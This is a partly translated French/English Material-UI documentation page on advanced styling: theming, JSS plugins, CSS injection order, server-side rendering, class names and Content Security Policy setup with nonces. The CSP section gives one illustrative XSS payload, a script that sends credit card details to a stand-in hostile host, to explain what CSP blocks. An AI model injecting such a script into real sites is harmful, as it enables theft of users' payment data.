# Avancé

<p class="description">Advanced Usage.</p>

## Theming

Add a `ThemeProvider` to the top level of your app to access the theme down the React's component tree. Then, you can access the theme object in the style functions.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

## Accessing the theme in a component

You might need to access the theme variables inside your React components.

### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

## Theme nesting

You can nest multiple theme providers. This can be really useful when dealing with different area of your application that have distinct appearance from each other.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

The inner theme will **override** the outer theme. You can extend the outer theme by providing a function:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS plugins

JSS uses the concept of plugins to extend its core, allowing people to cherry-pick the features they need. You pay the performance overhead for only what's you are using. All the plugins aren't available by default. We have added the following list:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

It's a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/). Of course, you are free to add a new plugin. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String templates

If you prefer using the CSS syntax, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template) plugin.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## CSS injection order

By default, the styles are injected **last** in the `<head>` element of your page. They gain more specificity than any other style sheet on your page e.g. CSS modules, styled components.

### injectFirst

The `StylesProvider` component has a `injectFirst` prop to inject the styles **first**:

```js
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Your component tree.
      Styled components can override Material-UI's styles. */}
</StylesProvider>
```

### insertionPoint

JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to gain more control on this situation. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.

#### HTML comment

The simplest approach is to add an HTML comment that determines where JSS will inject the styles:

```jsx
<head>
  <!-- jss-insertion-point -->
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### Other HTML element

[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around the issue, you can provide a DOM element (other than a comment) as the JSS insertion point.

For example, a `<noscript>` element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io prevents the access to the `<head>` element. To get around the issue, you can use the JavaScript `document.createComment()` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server-side rendering

This example returns a string of html and inlines the critical css required right before it’s used:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!doctype html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow our server side guide](/guides/server-rendering/) for a more detailed example or read the [`ServerStyleSheets`](/css-in-js/api/#serverstylesheets) API documentation.

### Gatsby

We have [an official plugin that](https://github.com/hupe1980/gatsby-plugin-material-ui) enables server-side rendering for @material-ui/styles. Refer to the plugin's page for setup and usage instructions.

Refer to [our example](https://github.com/mui-org/material-ui/blob/next/examples/gatsby-next/pages/_document.js) for an up-to-date usage example.

### Next.js

You need to have a custom `pages/_document.js`. Then [copy the logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.

Refer to [our example](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) for an up-to-date usage example.

## Class names

You may have noticed that the class names generated by our styling solution are **non-deterministic**, so you can't rely on them to stay the same. The class names are generated by [our class name generator](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Let's take the following style as an example:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

It will generate a `AppBar-root-123` class name. However, the following CSS won't work:

```css
.AppBar-root-123 {
  opacity: 0.6;
}
```

You have to use the `classes` property of a component to override them. Thanks to the non-deterministic nature of our class names, we can implement optimizations for development and production. They are easy to debug in development and as short as possible in production:

- In **development**, the class name will be: `.AppBar-root-123`, following this logic:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name will be: `.jss123`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

If you don't like this default behavior, you can change it. JSS s'appuie sur le concept de [générateur de nom de classe](https://cssinjs.org/jss-api/#generate-your-class-names) .

## CSS global

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

You can also combine JSS generated class names with global ones.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministic class names

We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. When turned on, the class names will look like this:

- development: `.AppBar-root`
- production: `.AppBar-root`

⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** Relying on it for code running in production has the following implications:

- It's harder to keep track of `classes` API changes between major releases.
- Global CSS is inherently fragile.

⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## CSS prefixes

JSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.

## Politique de sécurité du contenu (CSP)

### Qu'est-ce que le CSP et en quoi est-ce utile ?

Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Comment met-on en place un CSP?

Pour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un "nonce". Un "nonce" est une chaîne générée aléatoirement, utilisée une seule fois. Vous devez donc ajouter un proxy (middleware serveur) pour en générer un à chaque requête. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/next/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.

Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Il est très important d’utiliser UUID version 4, car cela génère un token ** imprévisible. **. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
/>
```

Ensuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes. Le côté client obtient le nonce à partir d'un en-tête. Vous devez inclure cet en-tête, que le SSR soit utilisé ou non.

```jsx
<meta property="csp-nonce" content={nonce} />
```